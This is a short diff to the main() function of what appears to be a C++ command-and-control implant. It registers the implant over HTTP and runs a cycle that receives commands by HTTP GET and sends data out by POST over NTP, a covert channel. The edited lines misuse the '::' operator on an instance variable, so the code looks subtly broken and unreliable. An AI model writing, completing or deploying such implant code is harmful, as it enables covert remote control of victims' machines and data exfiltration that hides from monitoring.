@@ -98,12 +98,16 @@ int temp_loop() {
 //}
 
 int main() {
+    //call this once to setup the maps
     C2Implant::init();
+
+    C2Implant implant;
+
     //register implant, choose any protocol that's included...
-    C2Implant::register_implant(InMethod::HTTP);
+    implant::register_implant(InMethod::HTTP);
     //ex, start cycle, with 
     //GET on http, POST on NTP
-    C2Implant::cycle(InMethod::HTTP, OutMethod::NTP);
+    implant::cycle(InMethod::HTTP, OutMethod::NTP);
 
     /*
     Add 2 commands.
